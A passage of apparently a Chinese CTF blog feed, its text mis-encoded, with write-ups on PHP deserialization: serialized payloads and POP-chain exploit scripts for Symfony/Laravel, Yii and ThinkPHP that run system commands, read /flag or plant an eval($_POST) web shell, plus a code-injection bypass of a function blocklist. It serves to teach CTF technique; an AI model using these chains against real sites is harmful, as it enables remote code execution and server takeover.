class="string">&#x27;upload_ok&#x27;</span>, <span class="string">&#x27;upload_fail&#x27;</span>, <span class="string">&#x27;reset&#x27;</span>), <span class="literal">true</span>))</span><br><span class="line">        finalize();</span><br><span class="line"><span class="comment">//        phpinfo();</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;\næ‰€ä»¥å“ªä¸ªISCCæ˜¯çœŸçš„ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»•è¿‡ * æ“ä½œï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å½“PHPååºåˆ—åŒ–çš„sæ¢æˆSçš„æ—¶å€™å°±å¯ä»¥æ˜¯ç”¨åå…­è¿›åˆ¶æ¥æ“ä½œ~</span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;ISCC_Upload&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;staasdtus&quot;</span>;O:<span class="number">13</span>:<span class="string">&quot;ISCC_ResetCMD&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot; * new_cmd&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;is_upload&quot;</span>;O:<span class="number">16</span>:<span class="string">&quot;ISCC_TellMeTruth&quot;</span>:<span class="number">0</span>:&#123;&#125;s:<span class="number">6</span>:<span class="string">&quot;status&quot;</span>;O:<span class="number">12</span>:<span class="string">&quot;ISCC_Command&quot;</span>:<span class="number">0</span>:&#123;&#125;&#125;&#125;</span><br><span class="line"></span><br><span class="line">O:<span class="number">11</span>:<span class="string">&quot;ISCC_Upload&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;status&quot;</span>;O:<span class="number">13</span>:<span class="string">&quot;ISCC_ResetCMD&quot;</span>:<span class="number">3</span>:&#123;S:<span class="number">10</span>:<span class="string">&quot;\00\2A\00new_cmd&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;ls&quot;</span>;s:<span class="number">9</span>:<span class="string">&quot;is_upload&quot;</span>;O:<span class="number">16</span>:<span class="string">&quot;ISCC_TellMeTruth&quot;</span>:<span class="number">0</span>:&#123;&#125;s:<span class="number">6</span>:<span class="string">&quot;status&quot;</span>;O:<span class="number">12</span>:<span class="string">&quot;ISCC_Command&quot;</span>:<span class="number">0</span>:&#123;&#125;&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>PHP</tag>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscnlaravel</title>
    <url>/2021/05/03/ciscnlaravel/</url>
    <content><![CDATA[<h1 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a>æ€è·¯ï¼š</h1><p>ä¸¤ä¸ªexpï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ProxyTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">PhpArrayTrait</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">ProxyTrait</span>;</span><br><span class="line">        <span class="keyword">private</span> $deferred ;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$pool</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = $pool;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = [<span class="string">&quot;exp&quot;</span>=&gt;<span class="keyword">new</span> CacheItem()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">PhpArrayAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">PhpArrayTrait</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>&#123;</span><br><span class="line">    <span class="title">trait</span> <span class="title">ProxyTrait</span>&#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">pool</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">trait</span> PhpArrayTrait&#123;</span><br><span class="line">        <span class="keyword">private</span> $values = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">private</span> $file = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>\<span class="title">PhpArrayAdapter</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>\<span class="title">TagAwareAdapter</span>;</span><br><span class="line"></span><br><span class="line">    $phpArray = <span class="keyword">new</span> PhpArrayAdapter();</span><br><span class="line">    $Tagwa = <span class="keyword">new</span> TagAwareAdapter($phpArray);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($Tagwa));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>è¿™ä¸ªæ˜¯åŒ…å«çš„ï¼Œä¹Ÿæ˜¯å¸‚é¢ä¸Šå¤§éƒ¨åˆ†çš„ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯å¯ä»¥å‘½ä»¤æ‰§è¡Œçš„ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">CacheItem</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>\<span class="title">ProxyTrait</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Ldap</span>\<span class="title">Adapter</span>\<span class="title">ExtLdap</span>\<span class="title">Adapter</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TagAwareAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">ProxyTrait</span>;</span><br><span class="line">        <span class="keyword">private</span> $deferred = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$pool</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = $pool;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferred = [<span class="string">&quot;ex&quot;</span>=&gt;<span class="keyword">new</span> CacheItem()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ProxyAdapter</span></span>&#123;</span><br><span class="line">        <span class="keyword">use</span> <span class="title">ProxyTrait</span>;</span><br><span class="line">        <span class="keyword">private</span> $setInnerItem=<span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">trait</span> ProxyTrait&#123;</span><br><span class="line">        <span class="keyword">private</span> $pool;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> $namespace = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pool = <span class="keyword">new</span> DefaultGenerator();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>&#123;</span><br><span class="line">    <span class="title">final</span> <span class="title">class</span> <span class="title">CacheItem</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span> = &quot;<span class="title">cat</span> /<span class="title">flag</span>&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>\<span class="title">ProxyAdapter</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Adapter</span>\<span class="title">TagAwareAdapter</span>;</span><br><span class="line"></span><br><span class="line">    $pool = <span class="keyword">new</span> ProxyAdapter();</span><br><span class="line">    $tag = <span class="keyword">new</span> TagAwareAdapter($pool);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize($tag));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>åŒ…å«çš„è¢«äººè®²çƒ‚äº†ï¼Œè¿™é‡Œè¯´è¯´å‘½ä»¤æ‰§è¡Œçš„è¿™æ¡é“¾ã€‚</p>
<p>å…¨å±€æœç´¢destructï¼Œèƒ½å¤Ÿæ‰¾åˆ°</p>
<p><img src="ciscnlaravel/image-20210508110947667.png" alt="image-20210508110947667"></p>
<p>è·Ÿè¿›è¿‡å»å¾ˆå¿«å°±å¯ä»¥æ‰¾åˆ°</p>
<p><img src="ciscnlaravel/image-20210508111003685.png" alt="image-20210508111003685"></p>
<p>ç„¶åå‘ç°è°ƒç”¨äº†ä¸€ä¸ªsaveDeferredæ–¹æ³•ï¼Œå…¨å±€æœç´¢saveDeferredï¼š</p>
<p>æ‰¾åˆ°ProxyAdapterç±»</p>
<p><img src="ciscnlaravel/image-20210508111149696.png" alt="image-20210508111149696"></p>
<p>è·Ÿè¿›doSaveæ–¹æ³•</p>
<p><img src="ciscnlaravel/image-20210508111233915.png" alt="image-20210508111233915"></p>
<p>è¿™é‡Œèƒ½å¤Ÿå‘ç°å¾ˆå¤šå‘½ä»¤æ‰§è¡Œçš„ç‚¹ï¼Œä½†æ˜¯å…¶å®æœ€ç»ˆè½åˆ°çš„åœ°æ–¹æ˜¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">$this</span>-&gt;setInnerItem)($innerItem, $item);</span><br></pre></td></tr></table></figure>

<p>å…ˆè¯´ä¸‹è¸©å¾—å‘ã€‚ä¸€å¼€å§‹æˆ‘ä¸€ç›´åœ¨æ‰¾ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$innerItem = $f(<span class="keyword">$this</span>-&gt;namespace.$item[<span class="string">&quot;\0*\0key&quot;</span>], <span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯è¿™æ ·ä¼šé‡è§ä¸€ä¸ªé—®é¢˜ï¼Œsystem</p>
<p><img src="ciscnlaravel/image-20210508111609499.png" alt="image-20210508111609499"></p>
<p>ç¬¬äºŒä¸ªå‚æ•°å¦‚æœè®¾ç½®ä¸ºnullï¼Œåˆ™ä¸ä¼šå›æ˜¾å†…å®¹..</p>
<p><img src="ciscnlaravel/image-20210508111726457.png" alt="image-20210508111726457"></p>
<p>è¿™æ ·</p>
<p><img src="ciscnlaravel/image-20210508111744147.png" alt="image-20210508111744147"></p>
<p>è€Œæˆ‘ä»¬å¯ä»¥çœ‹è§è¿™æ¡è¯­å¥çš„ç¬¬äºŒä¸ªå‚æ•°å·²ç»é”æ­»ä¸ºnulläº†ï¼Œæ‰€ä»¥æ— è®ºå¦‚ä½•éƒ½æ˜¯æ²¡åŠæ³•æ‰§è¡Œsystemçš„ã€‚</p>
<p>ä½†æ˜¯åæ¥æƒ³åˆ°å…¶å®å¯ä»¥ç”¨assert</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">assert(<span class="string">&quot;system(&#x27;dir&#x27;);&quot;</span>,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>PHP</tag>
        <tag>Laravel</tag>
      </tags>
  </entry>
  <entry>
    <title>thinkphp5.1</title>
    <url>/2021/05/04/thinkphp5-1/</url>
    <content><![CDATA[<h1 id="æ„Ÿè§‰è‡ªå·±ä¹‹å‰å†™çš„æ–‡ç« ç†è§£è¿˜æ˜¯ä¸å¤Ÿï¼Œæ‰€ä»¥åˆæ¥å†™"><a href="#æ„Ÿè§‰è‡ªå·±ä¹‹å‰å†™çš„æ–‡ç« ç†è§£è¿˜æ˜¯ä¸å¤Ÿï¼Œæ‰€ä»¥åˆæ¥å†™" class="headerlink" title="æ„Ÿè§‰è‡ªå·±ä¹‹å‰å†™çš„æ–‡ç« ç†è§£è¿˜æ˜¯ä¸å¤Ÿï¼Œæ‰€ä»¥åˆæ¥å†™"></a>æ„Ÿè§‰è‡ªå·±ä¹‹å‰å†™çš„æ–‡ç« ç†è§£è¿˜æ˜¯ä¸å¤Ÿï¼Œæ‰€ä»¥åˆæ¥å†™</h1><p>å¦‚æœåªæ˜¯å•çº¯çš„å¤ç°å¾ˆå¿«å°±ä¼šå¿˜æ‰ï¼Œæ‰€ä»¥éœ€è¦è‡ªå·±å¤šé è‡ªå·±å†æ¥å¤ç°ï¼Œè¿™æ¬¡æ˜¯åšn1bookä¸Šçš„å“ªä¸ªthinkphp5.1.</p>
<p>æ‰¾å…¥å£èƒ½å¤Ÿæ‰¾åˆ°windows.php</p>
<p><img src="image-20210504130710627.png" alt="image-20210504130710627"></p>
<p>æ‰¾åˆ°removeFileï¼Œçœ‹</p>
<p><img src="image-20210504130931338.png" alt="image-20210504130931338"></p>
<p>ç„¶åå‘ç°ä»»æ„æ–‡ä»¶åˆ é™¤ï¼Œç„¶è€Œæˆ‘ä»¬ä¸ä»…ä»…æƒ³è¦åšåˆ°è¿™ä¸ªï¼Œæƒ³æƒ³file_existsèƒ½å¤Ÿåšä»€ä¹ˆå‘¢ï¼Ÿå¯¹å§ï¼Œè¿˜å¯ä»¥æ‰¾toStringæ¥ç»§ç»­çœ‹ï¼ŒæŒ¨ä¸ªæ‰¾ï¼ˆè¿™é‡Œæˆ‘åªèƒ½è¯´æä¾›æ€è·¯ç»™å¤§å®¶ï¼Œå› ä¸ºæ‰¾è¿™ä¸ªæ˜¯ç›¸å½“çš„ç¹çå’Œç–²æƒ«çš„äº‹æƒ…ï¼Œå¦‚æœæŒ‰ç…§ç½‘ä¸Šçš„WPçš„è¯å°±å¾ˆå¿«ï¼Œä½†æ˜¯å¾€å¾€æ‰¾POPé“¾å°±æ˜¯å¾ˆç´¯ï¼‰ï¼Œæœ€ç»ˆèƒ½å¤Ÿé”å®šConversion.php</p>
<p><img src="image-20210504131141168.png" alt="image-20210504131141168"></p>
<p>è·Ÿè¿‡å»</p>
<p><img src="image-20210504131156216.png" alt="image-20210504131156216"></p>
<p>å†è·Ÿè¿‡å»çœ‹toArrayã€‚å°†æš‚æ—¶æ²¡ç”¨çš„ä»£ç æŠ˜å æ‰ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª$relation-&gt;visiible</p>
<p><img src="image-20210504131357627.png" alt="image-20210504131357627"></p>
<p>åˆ†æè¿™æ®µä»£ç åšçš„äº‹æƒ…ï¼š</p>
<ul>
<li>é¦–å…ˆé‡ç‚¹çœ‹çœ‹æ˜¯å¦å¯æ§ï¼Œé¦–å…ˆ$nameæ˜¯å¯æ§çš„ï¼Œ$nameæ¥è‡ªäº$this-&gt;appendçš„æ•°ç»„éå†ï¼Œè€Œè¯¥å‚æ•°æˆ‘ä»¬å¯ä»¥æ§åˆ¶ï¼Œæ•…å®Œå…¨å¯æ§</li>
<li>$relation = $this-&gt;getAttr($key)ï¼Œä¸ºæ­¤æˆ‘ä»¬éœ€è¦ä¿è¯$this-&gt;getRelation($key)è¿”å›çš„å†…å®¹ä¸ºç©º</li>
<li>æ»¡è¶³è¿™äº›æ¡ä»¶å°±å¯ä»¥è¿›å…¥$relation-&gt;visible($name),è€Œnameä¹Ÿå¯ä»¥æ§åˆ¶ï¼Œnameæ­¤æ—¶ä¼ è¿›å»çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ‰€ä»¥æˆ‘ä»¬å…¨å±€æœç´¢visibleæ–¹æ³•ï¼Œå¦‚æœä¸è¡Œå°±æ‰¾callæ–¹æ³•</li>
</ul>
<p>è¿™é‡Œå…ˆä¸¾å‡ºå…¶ä»–callæ–¹æ³•ä¸ºä»€ä¹ˆä¸ç”¨ï¼Œä¾‹å¦‚æˆ‘ä»¬å¯ä»¥å…ˆæ‰¾åˆ°ä¸€ä¸ªCache.php</p>
<p><img src="image-20210504132633411.png" alt="image-20210504132633411"></p>
<p>è¿™é‡Œçš„ç¬¬ä¸€ä¸ªå‚æ•°å°±ä¸å¯æ§ï¼Œå…¶ä»–çš„å¾ˆå¤šcallå‡½æ•°ä¹Ÿæ˜¯ç±»ä¼¼</p>
<p>æœ€ç»ˆæˆ‘ä»¬å¯ä»¥åœ¨Request.phpä¸‹æ‰¾åˆ°</p>
<p><img src="image-20210504132522167.png" alt="image-20210504132522167"></p>
<p>hookå®Œå…¨å¯æ§ï¼Œé‚£ä¹ˆæœ€ç»ˆæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œsystemå‘½ä»¤äº†(åŸæœ¬æˆ‘æ˜¯è¿™æ ·æƒ³çš„ï¼Œç»“æœè¿™å°±å°¼ç›æ˜¯å‰é¢çš„ä¸€å°éƒ¨åˆ†ï¼Œå› ä¸ºè¿™ä¸ªè¯¥æ­»çš„array_unshift)ï¼Œè®©è¿™ä¸ªé“¾å­é•¿äº†ä¸€å€å¤šï¼</p>
]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>fatååºåˆ—åŒ–æŒ–æ˜</title>
    <url>/2021/05/08/fat%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%8C%96%E6%8E%98/</url>
    <content><![CDATA[<p>è‡ªå·±å¤ç°äº†å¥½å‡ ä¸ªååºåˆ—åŒ–çš„æ¡†æ¶æ¼æ´äº†ï¼Œè‡ªå·±æ‰¾ä¸ªæ¡†æ¶ç»ƒç»ƒæ‰‹ï¼Œæ‹¿fatæ¡†æ¶é‡Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">unserialize($_GET[<span class="number">0</span>]);</span><br><span class="line">$f3-&gt;run();</span><br></pre></td></tr></table></figure>

<p>éšä¾¿æ·»åŠ ä¸€äº›</p>
]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>çº¢å¸½ä¸‰ä¸ªweb</title>
    <url>/2021/05/09/%E7%BA%A2%E5%B8%BD%E4%B8%89%E4%B8%AAweb/</url>
    <content><![CDATA[<h1 id="find-it"><a href="#find-it" class="headerlink" title="find it"></a>find it</h1><p>æºç æ³„éœ²ï¼Œè®¿é—®robots.txt,æ ¹æ®æç¤ºæ‰¾åˆ°æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $link = mysql_connect(<span class="string">&#x27;localhost&#x27;</span>, <span class="string">&#x27;root&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;title&gt;Hello worldd!&lt;/title&gt;</span><br><span class="line">	&lt;style&gt;</span><br><span class="line">	body &#123;</span><br><span class="line">		background-color: white;</span><br><span class="line">		text-align: center;</span><br><span class="line">		padding: <span class="number">50</span>px;</span><br><span class="line">		font-family: <span class="string">&quot;Open Sans&quot;</span>,<span class="string">&quot;Helvetica Neue&quot;</span>,Helvetica,Arial,sans-serif;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">#logo &#123;</span></span><br><span class="line">		margin-bottom: <span class="number">40</span>px;</span><br><span class="line">	&#125;</span><br><span class="line">	&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;img id=<span class="string">&quot;logo&quot;</span> src=<span class="string">&quot;logo.png&quot;</span> /&gt;</span><br><span class="line">	&lt;h1&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello My freind!&quot;</span>; <span class="meta">?&gt;</span>&lt;/h1&gt;</span><br><span class="line">	<span class="meta">&lt;?php</span> <span class="keyword">if</span>($link) &#123; <span class="meta">?&gt;</span></span><br><span class="line">		&lt;h2&gt;I Can<span class="string">&#x27;t view my php files?!&lt;/h2&gt;</span></span><br><span class="line"><span class="string">	&lt;?php &#125; else &#123; ?&gt;</span></span><br><span class="line"><span class="string">		&lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt;</span></span><br><span class="line"><span class="string">	&lt;?php &#125; ?&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">#Really easy...</span></span><br><span class="line"><span class="string">$file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);</span></span><br><span class="line"><span class="string">$I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);</span></span><br><span class="line"><span class="string">$a=$_GET[&#x27;</span>code<span class="string">&#x27;];</span></span><br><span class="line">if(preg_match(&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;,$a))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strlen($a)&gt;<span class="number">33</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">fwrite($hack,$a);</span><br><span class="line">fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);</span><br><span class="line">fclose($file);</span><br><span class="line">fclose($hack);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¼šå°†è¾“å…¥çš„ä¸œè¥¿å†™å…¥hack.php</p>
<p>å®¡è®¡æºç å¯ä»¥å‘ç°å†™å…¥å†…å®¹ä¼šè¢«å†™å…¥åˆ°hack.phpç›´æ¥å†™å…¥?&gt;&lt;?php phpinfo(); //è®¿é—®hack.phpï¼Œæœç´¢flagå³å¯</p>
<p><img src="QQ%E5%9B%BE%E7%89%8720210509184121.png" alt="QQå›¾ç‰‡20210509184121"></p>
<p>ä¸çŸ¥é“æ˜¯ä¸æ˜¯éé¢„æœŸï¼Œflagç›´æ¥åœ¨ç¯å¢ƒé‡Œé¢äº† = =</p>
<h1 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h1><p>ç®€å•ååºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;file_put_contents(\&#x27;1.php\&#x27;,&quot;&lt;?php eval(\$_POST[0]);&quot;)&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $keys = [];</span><br><span class="line">        <span class="keyword">private</span> $path;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;axin&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;is&quot;</span>=&gt;<span class="string">&quot;handsome&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ç”Ÿæˆpoc</span></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"><span 